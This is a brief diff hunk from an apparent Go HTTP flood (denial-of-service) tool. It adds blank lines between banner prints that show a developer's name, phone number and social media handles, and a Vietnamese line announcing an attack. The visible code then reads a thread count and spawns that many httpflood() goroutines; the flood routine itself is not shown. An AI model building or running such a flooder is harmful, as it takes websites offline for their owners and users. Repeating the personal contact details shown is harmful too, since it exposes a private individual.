@@ -34,12 +34,19 @@ func main(){
   threads, _ := strconv.Atoi(os.Args[3])
   log.Print("Được Tính Theo Giờ UTC")
   fmt.Print("\033[38;5;123m╦╔╗╔╔╦╗╦═╗╔═╗")
+  
   fmt.Print("\033[38;5;123m║║║║ ║║╠╦╝╠═╣")
+  
   fmt.Print("\033[38;5;123m╩╝╚╝═╩╝╩╚═╩ ╩")
+  
   fmt.Print("\033[31mDEV\x1b[31m:\x1b[38;5;123mNgThanhVinh")
+  
   fmt.Print("\033[31mZalo\x1b[31m:\x1b[38;5;123m0927423139")
+  
   fmt.Print("\033[31mFB\x1b[31m:\x1b[38;5;123mNgThanhVinhxDeath")
+  
   fmt.Print("\033[31mTele\x1b[31m:\x1b[38;5;123m@Vinhyetquaidan")
+  
   fmt.Print("\033[31m          Đang Tấn Công, Đéo Spam Okay ?            ")
    for i:=0; i < threads; i++{
      go httpflood()
